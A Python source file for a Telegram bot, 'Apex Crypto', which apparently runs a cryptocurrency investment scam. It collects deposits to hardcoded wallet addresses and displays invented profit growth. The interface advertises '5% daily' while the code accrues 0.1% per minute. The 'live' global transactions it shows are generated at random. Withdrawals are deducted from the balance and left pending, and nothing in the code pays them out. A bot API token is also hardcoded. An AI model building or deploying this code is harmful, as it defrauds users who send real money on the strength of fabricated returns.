import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import datetime
import random

# Servidor web básico para mantener activo el bot en Render
app = Flask('')

@app.route('/')
def home():
    return "Apex Crypto Bot is online! 🚀"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

TOKEN = '8976336886:AAG_76KLFWW9HGv9GIquqqiiGWDcDuOQw4A'
bot = telebot.TeleBot(TOKEN)
DB_NAME = 'apex_crypto.db'  # Nombre de base de datos profesional

# Tu ID de Telegram para recibir las notificaciones de depósitos y retiros
ADMIN_ID = 7635269112  

# Direcciones de depósito reales
DEPOSIT_ADDRESSES = {
    'btc': ('BTC', 'bc1q46f64ny6k85954ndlzvh32kuc40mqdhxw7fxls'),
    'eth': ('ETH / ERC-20 (ETH, USDT, USDC)', '0xfC1dF2CBD973D1234d2108996Cc8694d7489dDdB'),
    'polygon': ('Polygon (MATIC, USDT, USDC)', '0xfC1dF2CBD973D1234d2108996Cc8694d7489dDdB'),
    'bnb': ('BNB Chain (BNB, USDT, USDC)', '0xfC1dF2CBD973D1234d2108996Cc8694d7489dDdB'),
    'base': ('BASE (ETH, USDT, USDC)', '0xfC1dF2CBD973D1234d2108996Cc8694d7489dDdB'),
    'tron': ('TRON (TRX, USDT)', 'TWgDYwExwx7G3Cr2kY6xj18tdfd6KM2fLU'),
    'xrp': ('XRP', 'rh6GEmHCXDUUJsCrnr3HusmUXkWNGjFyhN'),
    'solana': ('Solana (SOL, USDT, USDC)', 'DM3ER7SdSAH6GZwisRVXFashLnPXpeaFKmrKEjDrpTPK')
}

# Redes disponibles para retiro
WITHDRAW_NETWORKS = {
    'w_btc': 'BTC',
    'w_eth': 'ETH / ERC-20',
    'w_polygon': 'Polygon',
    'w_bnb': 'BNB Chain',
    'w_base': 'BASE',
    'w_tron': 'TRON (TRC-20)',
    'w_xrp': 'XRP',
    'w_solana': 'Solana'
}

# Inicia la base de datos de usuarios si no existe
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 100.0,
            invested REAL DEFAULT 0.0,
            last_invest_time TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER,
            type TEXT,
            amount REAL,
            status TEXT,
            date TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Obtiene los datos del usuario o lo registra
def get_user(telegram_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT balance, invested, last_invest_time FROM users WHERE telegram_id = ?', (telegram_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (telegram_id, balance, invested, last_invest_time) VALUES (?, 100.0, 0.0, NULL)', (telegram_id,))
        conn.commit()
        balance, invested, last_invest_time = 100.0, 0.0, None
    else:
        balance, invested, last_invest_time = row
    conn.close()
    return balance, invested, last_invest_time

# Actualiza los saldos del usuario en la base de datos
def update_user(telegram_id, balance, invested, last_invest_time):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = ?, invested = ?, last_invest_time = ? WHERE telegram_id = ?', (balance, invested, last_invest_time, telegram_id))
    conn.commit()
    conn.close()

# Agrega una transacción al historial
def add_transaction(telegram_id, t_type, amount, status):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    cursor.execute('INSERT INTO transactions (telegram_id, type, amount, status, date) VALUES (?, ?, ?, ?, ?)', 
                   (telegram_id, t_type, amount, status, now_str))
    conn.commit()
    conn.close()

# Menú principal con botones
def main_menu_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_balance = types.KeyboardButton("💳 Balance")
    btn_invest = types.KeyboardButton("📈 Invest")
    btn_deposit = types.KeyboardButton("📥 Deposit")
    btn_history = types.KeyboardButton("📋 History")
    btn_claim = types.KeyboardButton("💰 Claim Profit")
    btn_withdraw = types.KeyboardButton("💸 Withdraw")
    markup.add(btn_balance, btn_invest, btn_deposit, btn_history, btn_claim, btn_withdraw)
    return markup

# Teclado especial para cancelar operaciones
def cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_cancel = types.KeyboardButton("❌ Cancelar")
    markup.add(btn_cancel)
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    telegram_id = message.from_user.id
    get_user(telegram_id)  # Registra al usuario si es nuevo
    welcome_text = ( 
        "Welcome to **Apex Crypto**! 🚀\n\n" 
        "Your premium secure investment dashboard.\n\n" 
        "Use the buttons below to manage your account:"
    ) 
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=main_menu_keyboard())

@bot.message_handler(func=lambda message: message.text == "💳 Balance")
def check_balance(message):
    telegram_id = message.from_user.id
    balance, invested, last_invest_time = get_user(telegram_id)
    
    profit_percentage = 0.0
    pending_profit = 0.0
    
    if invested > 0 and last_invest_time:
        try:
            start_time = datetime.datetime.fromisoformat(last_invest_time)
            now = datetime.datetime.now()
            diff_minutes = (now - start_time).total_seconds() / 60.0
            # Crecimiento del 0.1% por minuto en la interfaz
            profit_percentage = diff_minutes * 0.1
            pending_profit = invested * (profit_percentage / 100.0)
        except Exception:
            pass

    balance_text = ( 
        "💳 **Your Apex Wallet**:\n\n" 
        f"• Available Balance: ${balance:.2f} USD\n" 
        f"• Invested Funds: ${invested:.2f} USD\n\n" 
        f"📊 **Investment Growth**:\n" 
        f"• Profit Rate: **5.00% Daily**\n" 
        f"• Current Growth: **+{profit_percentage:.3f}%**\n" 
        f"• Unclaimed Profit: **${pending_profit:.4f} USD**"
    ) 
    bot.reply_to(message, balance_text, parse_mode='Markdown', reply_markup=main_menu_keyboard())

# --- DEPOSITOS ---
def deposit_networks_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_btc = types.InlineKeyboardButton("BTC 🪙", callback_data="net_btc")
    btn_eth = types.InlineKeyboardButton("ETH / ERC-20 🌐", callback_data="net_eth")
    btn_poly = types.InlineKeyboardButton("Polygon 🟣", callback_data="net_polygon")
    btn_bnb = types.InlineKeyboardButton("BNB Chain 🟡", callback_data="net_bnb")
    btn_base = types.InlineKeyboardButton("BASE 🔵", callback_data="net_base")
    btn_tron = types.InlineKeyboardButton("TRON 🔴", callback_data="net_tron")
    btn_xrp = types.InlineKeyboardButton("XRP 🌐", callback_data="net_xrp")
    btn_sol = types.InlineKeyboardButton("Solana 🟢", callback_data="net_solana")
    markup.add(btn_btc, btn_eth, btn_poly, btn_bnb, btn_base, btn_tron, btn_xrp, btn_sol)
    return markup

@bot.message_handler(func=lambda message: message.text == "📥 Deposit")
def show_deposit_menu(message):
    deposit_text = ( 
        "📥 **Deposit Funds**\n\n" 
        "Choose your network to view your deposit address:"
    ) 
    bot.reply_to(message, deposit_text, parse_mode='Markdown', reply_markup=deposit_networks_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith('net_'))
def show_network_address(call):
    network_key = call.data.replace('net_', '')
    network_name, address = DEPOSIT_ADDRESSES[network_key]
    
    address_text = ( 
        f"📥 **Deposit via {network_name}**\n\n" 
        "Send your deposit to this address:\n" 
        f"`{address}`\n\n" 
        "⚠️ **Once completed**, click the button below to submit your payment details for immediate approval."
    ) 
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_confirm = types.InlineKeyboardButton("✅ Confirm Deposit", callback_data="confirm_dep")
    btn_back = types.InlineKeyboardButton("⬅️ Back to Networks", callback_data="back_to_networks")
    markup.add(btn_confirm, btn_back)
    
    bot.edit_message_text(address_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_networks")
def back_to_networks(call):
    deposit_text = ( 
        "📥 **Deposit Funds**\n\n" 
        "Choose your network to view your deposit address:"
    ) 
    bot.edit_message_text(deposit_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=deposit_networks_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "confirm_dep")
def ask_deposit_amount(call):
    msg = bot.send_message(call.message.chat.id, "Please type the exact amount you deposited in USD (Example: 150):", reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_deposit_amount)

def process_deposit_amount(message):
    if message.text == "❌ Cancelar":
        bot.reply_to(message, "❌ Process cancelled.", reply_markup=main_menu_keyboard())
        return
        
    try:
        amount = float(message.text)
        if amount <= 0:
            bot.reply_to(message, "Amount must be greater than 0.", reply_markup=main_menu_keyboard())
            return
        
        msg = bot.reply_to(message, "Please paste the Transaction Hash (TXID) or your Wallet Address to verify:", reply_markup=cancel_keyboard())
        bot.register_next_step_handler(msg, process_deposit_proof, amount)
    except ValueError:
        bot.reply_to(message, "Invalid number. Process cancelled.", reply_markup=main_menu_keyboard())

def process_deposit_proof(message, amount):
    if message.text == "❌ Cancelar":
        bot.reply_to(message, "❌ Process cancelled.", reply_markup=main_menu_keyboard())
        return
        
    txid = message.text
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else f"ID: {user_id}"
    
    bot.reply_to(message, "📥 **Deposit Submitted!**\nYour transaction is being processed and will be credited soon.", parse_mode='Markdown', reply_markup=main_menu_keyboard())
    add_transaction(user_id, "Deposit", amount, "Pending")
    
    admin_markup = types.InlineKeyboardMarkup()
    btn_approve = types.InlineKeyboardButton("✅ Approve", callback_data=f"app_{user_id}_{amount}")
    btn_reject = types.InlineKeyboardButton("❌ Reject", callback_data=f"rej_{user_id}_{amount}")
    admin_markup.add(btn_approve, btn_reject)
    
    admin_msg = ( 
        "🔔 **New Deposit Request!**\n\n" 
        f"• User: {username}\n" 
        f"• Amount: ${amount:.2f} USD\n" 
        f"• Proof/TXID: `{txid}`"
    ) 
    try:
        bot.send_message(ADMIN_ID, admin_msg, parse_mode='Markdown', reply_markup=admin_markup)
    except Exception as e:
        print(f"Admin alert failed: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith(('app_', 'rej_')))
def handle_admin_action(call):
    data = call.data.split('_')
    action = data[0]
    user_id = int(data[1])
    amount = float(data[2])
    
    balance, invested, last_invest_time = get_user(user_id)
    
    if action == 'app':
        new_balance = balance + amount
        update_user(user_id, new_balance, invested, last_invest_time)
        add_transaction(user_id, "Deposit", amount, "Completed")
        try:
            bot.send_message(user_id, f"🔔 **Deposit Approved!**\n**${amount:.2f} USD** has been added to your balance.", parse_mode='Markdown')
        except Exception:
            pass
        bot.edit_message_text(f"✅ Approved: ${amount:.2f} credited to user {user_id}.", call.message.chat.id, call.message.message_id)
    elif action == 'rej':
        add_transaction(user_id, "Deposit", amount, "Rejected")
        try:
            bot.send_message(user_id, f"❌ **Deposit Declined**\nYour deposit of **${amount:.2f} USD** could not be verified.", parse_mode='Markdown')
        except Exception:
            pass
        bot.edit_message_text(f"❌ Rejected: Deposit of ${amount:.2f} for user {user_id} was declined.", call.message.chat.id, call.message.message_id)

# --- NUEVO FLUJO DE RETIROS INTERACTIVOS ---
def withdraw_networks_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_btc = types.InlineKeyboardButton("BTC 🪙", callback_data="w_btc")
    btn_eth = types.InlineKeyboardButton("ETH / ERC-20 🌐", callback_data="w_eth")
    btn_poly = types.InlineKeyboardButton("Polygon 🟣", callback_data="w_polygon")
    btn_bnb = types.InlineKeyboardButton("BNB Chain 🟡", callback_data="w_bnb")
    btn_base = types.InlineKeyboardButton("BASE 🔵", callback_data="w_base")
    btn_tron = types.InlineKeyboardButton("TRON 🔴", callback_data="w_tron")
    btn_xrp = types.InlineKeyboardButton("XRP 🌐", callback_data="w_xrp")
    btn_sol = types.InlineKeyboardButton("Solana 🟢", callback_data="w_solana")
    markup.add(btn_btc, btn_eth, btn_poly, btn_bnb, btn_base, btn_tron, btn_xrp, btn_sol)
    return markup

@bot.message_handler(func=lambda message: message.text == "💸 Withdraw")
def withdraw_prompt(message):
    withdraw_text = ( 
        "💸 **Withdraw Funds**\n\n" 
        "Please choose the blockchain network you wish to receive your funds on:"
    ) 
    bot.reply_to(message, withdraw_text, parse_mode='Markdown', reply_markup=withdraw_networks_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith('w_'))
def handle_withdraw_network(call):
    network_key = call.data
    network_name = WITHDRAW_NETWORKS[network_key]
    
    # Guardamos la red elegida y solicitamos la dirección usando el teclado de cancelar
    msg = bot.send_message(call.message.chat.id, f"📥 **Withdrawal via {network_name}**\n\nPlease paste your receiving wallet address:", parse_mode='Markdown', reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_withdraw_address, network_name)

def process_withdraw_address(message, network_name):
    if message.text == "❌ Cancelar":
        bot.reply_to(message, "❌ Process cancelled.", reply_markup=main_menu_keyboard())
        return
        
    wallet_address = message.text
    
    # Solicitar el monto
    msg = bot.reply_to(message, f"💸 **Network**: {network_name}\n**Wallet**: `{wallet_address}`\n\nPlease type the amount you want to withdraw (Min. $50):", parse_mode='Markdown', reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_withdraw_amount, network_name, wallet_address)

def process_withdraw_amount(message, network_name, wallet_address):
    if message.text == "❌ Cancelar":
        bot.reply_to(message, "❌ Process cancelled.", reply_markup=main_menu_keyboard())
        return
        
    telegram_id = message.from_user.id
    balance, invested, last_invest_time = get_user(telegram_id)
    
    try: 
        amount = float(message.text)
        if amount < 50:
            bot.reply_to(message, "The minimum withdrawal amount is **$50.00 USD**.", parse_mode='Markdown', reply_markup=main_menu_keyboard())
            return
            
        if amount > balance:
            bot.reply_to(message, f"Insufficient funds. Your available balance is ${balance:.2f} USD.", reply_markup=main_menu_keyboard())
            return
            
        new_balance = balance - amount
        update_user(telegram_id, new_balance, invested, last_invest_time)
        add_transaction(telegram_id, "Withdraw", amount, "Pending")
        
        bot.reply_to(message, f"💸 **Withdrawal Requested Successfully!**\n\n• Amount: **${amount:.2f} USD**\n• Network: {network_name}\n• Destination Address: `{wallet_address}`\n\nOur support team will process your withdrawal request shortly.", parse_mode='Markdown', reply_markup=main_menu_keyboard())
        
        # Alerta opcional para ti como admin de que alguien solicitó retiro
        username = f"@{message.from_user.username}" if message.from_user.username else f"ID: {telegram_id}"
        admin_msg = ( 
            "⚠️ **New Withdrawal Request!**\n\n" 
            f"• User: {username}\n" 
            f"• Amount: ${amount:.2f} USD\n" 
            f"• Network: {network_name}\n" 
            f"• Address: `{wallet_address}`"
        )
        try:
            bot.send_message(ADMIN_ID, admin_msg, parse_mode='Markdown')
        except Exception:
            pass
            
    except ValueError:
        bot.reply_to(message, "Invalid number. Process cancelled.", reply_markup=main_menu_keyboard())

# --- HISTORIAL ---
@bot.message_handler(func=lambda message: message.text == "📋 History")
def show_history(message):
    telegram_id = message.from_user.id
    
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT type, amount, status, date FROM transactions WHERE telegram_id = ? ORDER BY id DESC LIMIT 3', (telegram_id,))
    rows = cursor.fetchall()
    conn.close()
    
    history_text = "📋 **Transaction History**:\n\n"
    
    if rows:
        history_text += "*Your Transactions:*\n"
        for row in rows:
            icon = "📥" if row[0] == "Deposit" else "💸"
            history_text += f"{icon} {row[0]}: ${row[1]:.2f} ({row[2]}) - {row[3]}\n"
        history_text += "\n"
    
    history_text += "🌐 *Global Network Transactions (Live):*\n"
    tx_types = ["Deposit", "Withdraw", "Invest"]
    statuses = ["Completed", "Processing"]
    
    for _ in range(4):
        rand_type = random.choice(tx_types)
        rand_amount = random.uniform(10.0, 850.0)
        rand_status = random.choice(statuses) if rand_type != "Invest" else "Active"
        rand_time = (datetime.datetime.now() - datetime.timedelta(minutes=random.randint(2, 55))).strftime("%H:%M")
        
        icon = "📥" if rand_type == "Deposit" else ("💸" if rand_type == "Withdraw" else "📈")
        history_text += f"• {icon} {rand_type} of **${rand_amount:.2f}** - {rand_status} ({rand_time})\n"
        
    bot.reply_to(message, history_text, parse_mode='Markdown', reply_markup=main_menu_keyboard())

# --- INVERTIR ---
@bot.message_handler(func=lambda message: message.text == "📈 Invest")
def invest_prompt(message):
    msg = bot.reply_to(message, "Please type the amount you want to invest (Example: 50):", reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_invest)

def process_invest(message):
    if message.text == "❌ Cancelar":
        bot.reply_to(message, "❌ Process cancelled.", reply_markup=main_menu_keyboard())
        return
        
    telegram_id = message.from_user.id
    balance, invested, last_invest_time = get_user(telegram_id)
    
    try:
        amount = float(message.text)
        if amount <= 0:
            bot.reply_to(message, "Please enter an amount greater than 0.", reply_markup=main_menu_keyboard())
            return
            
        if amount > balance:
            bot.reply_to(message, f"You don't have enough balance. Your balance is ${balance:.2f} USD.", reply_markup=main_menu_keyboard())
            return
            
        new_balance = balance - amount
        new_invested = invested + amount
        now_str = datetime.datetime.now().isoformat()
        update_user(telegram_id, new_balance, new_invested, now_str)
        add_transaction(telegram_id, "Invest", amount, "Active")
        
        bot.reply_to(message, f"Successfully invested **${amount:.2f} USD**! 📈\nYour daily profit will now start accumulating.", parse_mode='Markdown', reply_markup=main_menu_keyboard())
        
    except ValueError:
        bot.reply_to(message, "Invalid number. Process cancelled.", reply_markup=main_menu_keyboard())

# --- RECLAMAR RECOMPENSAS ---
@bot.message_handler(func=lambda message: message.text == "💰 Claim Profit")
def claim_profit(message):
    telegram_id = message.from_user.id
    balance, invested, last_invest_time = get_user(telegram_id)
    
    if invested <= 0 or not last_invest_time:
        bot.reply_to(message, "You don't have any active investments. Use 'Invest' to start earning.", reply_markup=main_menu_keyboard())
        return
        
    try:
        start_time = datetime.datetime.fromisoformat(last_invest_time)
        now = datetime.datetime.now()
        diff_minutes = (now - start_time).total_seconds() / 60.0
        profit_percentage = diff_minutes * 0.1
        profit = invested * (profit_percentage / 100.0)
    except Exception:
        profit = 0.0
    
    if profit <= 0:
        bot.reply_to(message, "No new profits to claim yet. Please wait a little longer!", reply_markup=main_menu_keyboard())
        return
        
    new_balance = balance + profit
    now_str = datetime.datetime.now().isoformat()
    update_user(telegram_id, new_balance, invested, now_str) 
    add_transaction(telegram_id, "Profit Claim", profit, "Completed")
    
    bot.reply_to(message, f"Claimed **${profit:.4f} USD** in profit! 💰\nAdded to your available balance.", parse_mode='Markdown', reply_markup=main_menu_keyboard())

if __name__ == '__main__':
    init_db()
    keep_alive()
    print("Apex Crypto Bot is starting...")
    bot.infinity_polling()
